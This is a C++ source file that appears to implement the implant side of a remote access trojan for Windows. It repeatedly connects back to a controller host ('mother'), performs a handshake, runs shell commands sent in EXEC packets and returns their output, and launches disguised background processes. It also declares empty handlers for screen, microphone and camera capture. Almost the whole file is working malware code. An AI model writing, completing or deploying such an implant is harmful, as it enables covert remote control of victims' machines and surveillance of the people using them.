#include <rat.hpp>

Rat::Rat(): lhost(LHOST), lport(LPORT) {
    // Before using WinSock you must initialize the API
    // before using any socket related functonality
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return;
    }

    while (true) {
        Ping();
        std::cout << "[+] Established with MOTHER!" << std::endl;
        Listen();
    }

    closesocket(mother);
    WSACleanup(); // cleans up the API
}

RatState Rat::GetState() const {
    return ratState;
}

// when connection isnt established ping the endpoint
void Rat::Ping() {
    while (ratState != RatState::ESTAB) {
        std::cout << "[*] Attempting to create Socket. . ." << std::endl;
        mother = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (mother == INVALID_SOCKET_HANDLE) {
            std::cerr << "[-] Socket creation failed.\n";

            ratState = RatState::PINGING;
            closesocket(mother);
            std::this_thread::sleep_for(std::chrono::seconds(3));

            continue;
        }

        sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(lport);
        inet_pton(AF_INET, lhost.c_str(), &serv_addr.sin_addr);

        std::cout << "[*] Attempting to Connect to | " << lhost << ":" << lport << std::endl;

        if (connect(mother, (sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
            std::cerr << "[-] Connection failed.\n";

            ratState = RatState::PINGING;
            closesocket(mother);
            std::this_thread::sleep_for(std::chrono::seconds(3));

            continue;
        }

        // attempt to establish stable connection
        if (EstablishConnection()) {
            ratState = RatState::ESTAB;
        }
    }
    std::cout << "[+] Connected!" << std::endl;
}

// send an initialize packet to inform we are active
bool Rat::EstablishConnection() {
    std::cout << "[*] Attempting to Establish Connection. . ." << std::endl;

    if (!RatPacketUtils::Send(mother, RatPacket("imgettingratty", MsgType::INIT))) {
        std::cerr << "[-] Failed to send INIT Packet!" << std::endl;
        return false;
    }

    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(mother);
    if (recvPacket.second && !recvPacket.first.IsCorrupted()) {
        std::cout << "[*] Recv Challenge. . ." << std::endl;

        // recv challenge
        std::string code = recvPacket.first.GetPacketMessage();

        std::cout << "[*] Replying to Challenge. . ." << std::endl;
        // reply to it
        if (!RatPacketUtils::Send(mother, RatPacket(code, MsgType::INIT))) {
            std::cerr << "[-] Failed to send Challenge Reply Packet!" << std::endl;
            return false;
        }

        // final ack of before possible estab
        recvPacket = RatPacketUtils::Recv(mother);
        if (recvPacket.second && !recvPacket.first.IsCorrupted()) {
            std::cout << "[*] Recv Estab Ack. . ." << std::endl;
            return recvPacket.first.GetPacketMessage() == "ratty";
        }
        return false;
    } else {
        std::cerr << "[-] Initiation Failed!" << std::endl;
        return false;
    }
}

// send non-init packets back to mother
void Rat::Listen() {
    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(mother);
    if (recvPacket.second) {
        RatPacket packet = recvPacket.first;
        // process packet data
        if (packet.GetType() == MsgType::EXEC) {
            std::cout << "[*] Recv EXEC packet. . ." << std::endl;

            if (UserProc::getInstance().Run(packet.GetPacketMessage())) {
                std::string output = UserProc::getInstance().Show();
                RatPacketUtils::Send(mother, RatPacket(output, MsgType::OUTPUT));
            }
        } else if (packet.GetType() == MsgType::INVOKE) {
            // create innocent background process
            bool procCreated = UserProc::getInstance().CreateBackProc(
                packet.GetPacketMessage()
            );

            if (procCreated) {
                std::string output = UserProc::getInstance().Show();
                RatPacketUtils::Send(mother, RatPacket(output, MsgType::OUTPUT));
            } else {
                std::cerr << "[-] Error during proc prep." << std::endl;
            }
        } else if (packet.GetType() == MsgType::SCREEN) {

        } else if (packet.GetType() == MsgType::MIC) {

        } else if (packet.GetType() == MsgType::CAMERA) {

        } else if (packet.GetType() == MsgType::NONE) {
            // connection closed by remote endpoint
            if (packet.GetPacketMessage() == "closed") {
                std::cerr << "[-] Socket connection closed." << std::endl;
                ratState = RatState::LOST;
                closesocket(mother);
                return;
            }
        } else {
            std::cerr << "[*] Unsure how to process typeid: " <<
                static_cast<int>(packet.GetType()) << std::endl;
        }
    } else {
        ratState = RatState::LOST;
        closesocket(mother);
    }
}